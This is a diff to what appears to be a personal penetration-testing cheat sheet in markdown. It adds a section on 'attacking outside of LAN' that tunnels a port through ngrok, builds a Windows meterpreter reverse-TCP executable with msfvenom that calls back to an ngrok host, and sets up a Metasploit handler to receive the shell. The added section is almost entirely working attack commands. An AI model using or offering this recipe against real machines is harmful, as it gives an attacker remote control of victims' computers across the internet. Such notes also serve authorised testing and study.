@@ -536,6 +536,27 @@ stop
 /sbin/service nessusd stop
 ```
 
+## attacking outside of LAN
+
+start ngrok
+```
+./ngrok tcp 9999
+```
+
+generate payload
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=19034 -f exe > payload.exe
+```
+
+listen from msfconsole
+```
+use exploit/multi/handler 
+set PAYLOAD windows/meterpreter/reverse_tcp 
+set LHOST 0.0.0.0 set 
+LPORT 9999 
+run -j
+```
+
 ## CheckList
 
 
